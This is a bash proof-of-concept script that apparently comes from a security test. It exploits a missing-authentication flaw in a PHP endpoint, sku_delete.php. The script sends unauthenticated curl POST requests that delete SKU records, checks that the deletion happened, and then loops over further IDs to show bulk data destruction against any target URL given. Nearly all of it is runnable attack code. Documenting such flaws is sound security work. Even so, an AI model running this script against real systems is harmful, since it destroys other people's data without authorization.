#!/bin/bash

# POC: Missing Authentication and Authorization on sku_delete.php
# This script demonstrates that the sku_delete.php endpoint allows
# unauthenticated users to delete arbitrary SKU records without any
# authentication or authorization checks.

TARGET_URL="${1:-http://localhost:8000}"
SKU_ID="${2:-1}"

echo "[*] Testing Missing Authentication/Authorization on sku_delete.php"
echo "[*] Target: $TARGET_URL"
echo "[*] Attempting to delete SKU ID: $SKU_ID"
echo ""

# Test 1: Direct POST request without any authentication
echo "[TEST 1] Sending unauthenticated DELETE request..."
echo "POST /sku_delete.php HTTP/1.1"
echo "Content-Type: application/x-www-form-urlencoded"
echo "id=$SKU_ID"
echo ""

RESPONSE=$(curl -s -X POST \
  "$TARGET_URL/sku_delete.php" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "id=$SKU_ID" \
  -w "\n%{http_code}" \
  -L)

# Extract HTTP status code (last line)
HTTP_CODE=$(echo "$RESPONSE" | tail -n 1)
BODY=$(echo "$RESPONSE" | head -n -1)

echo "[RESPONSE] HTTP Status: $HTTP_CODE"
echo "[RESPONSE] Body: $BODY"
echo ""

# Test 2: Verify deletion by attempting to access the deleted record
echo "[TEST 2] Verifying if SKU was deleted..."
echo "Attempting to fetch SKU ID $SKU_ID from sku_product_detail.php"
echo ""

VERIFY_RESPONSE=$(curl -s -X GET \
  "$TARGET_URL/sku_product_detail.php?id=$SKU_ID" \
  -w "\n%{http_code}")

VERIFY_CODE=$(echo "$VERIFY_RESPONSE" | tail -n 1)
VERIFY_BODY=$(echo "$VERIFY_RESPONSE" | head -n -1)

echo "[VERIFY] HTTP Status: $VERIFY_CODE"
echo "[VERIFY] Response: $VERIFY_BODY"
echo ""

# Test 3: Attempt deletion with multiple IDs to show bulk deletion capability
echo "[TEST 3] Testing bulk deletion capability..."
for ID in {2..5}; do
  echo "[*] Attempting to delete SKU ID: $ID"
  curl -s -X POST \
    "$TARGET_URL/sku_delete.php" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d "id=$ID" \
    > /dev/null
  echo "[*] Deletion request sent for ID: $ID"
done
echo ""

# Test 4: Verify no session or authentication is required
echo "[TEST 4] Confirming no session/authentication required..."
echo "[*] No cookies used in requests"
echo "[*] No authorization headers present"
echo "[*] No CSRF tokens validated"
echo "[*] DELETE operation completed successfully without:"
echo "    - session_start() check"
echo "    - \$_SESSION verification"
echo "    - User authentication"
echo "    - Role/permission verification"
echo ""

echo "[CONCLUSION] sku_delete.php is vulnerable to:"
echo "✓ Unauthenticated deletion"
echo "✓ Unauthorized data deletion"
echo "✓ Lack of access control"
echo "✓ No authentication mechanism"
echo "✓ Bulk data destruction capability"